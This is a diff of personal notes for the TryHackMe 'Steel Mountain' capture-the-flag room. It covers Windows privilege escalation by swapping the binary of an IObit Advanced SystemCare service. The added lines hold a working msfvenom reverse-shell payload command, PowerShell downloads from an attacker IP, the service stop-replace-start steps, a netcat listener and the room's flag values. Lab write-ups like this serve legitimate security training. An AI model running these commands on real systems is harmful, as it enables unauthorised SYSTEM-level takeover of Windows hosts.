@@ -149,11 +149,21 @@ more user.txt
 b04763b6fcf51fcd7c13abc7db4fd365
 
 On my machine wget https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx86.exe
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.118.24 LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=myip LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe
 
 on target machine
 powershell -c wget "http://10.6.88.227/winPEASx86.exe" -outfile "winPEASx86.exe"
 powershell -c wget "http://10.6.88.227/ASCService.exe" -outfile "ASCService.exe"
+sc stop AdvancedSystemCareService9
+copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+sc start AdvancedSystemCareService9
+on other terminal
+nc -lnvp 4443
+c:\windows\system32
+whoami
+nt authority\system
+more c:\Users\Administrator\Desktop>root.txt
+9af5f314f57607c00fd09803a587db80
 
 https://tryhackme.com/room/steelmountain
 https://blog.razrsec.uk/steel-mountain-walkthrough/
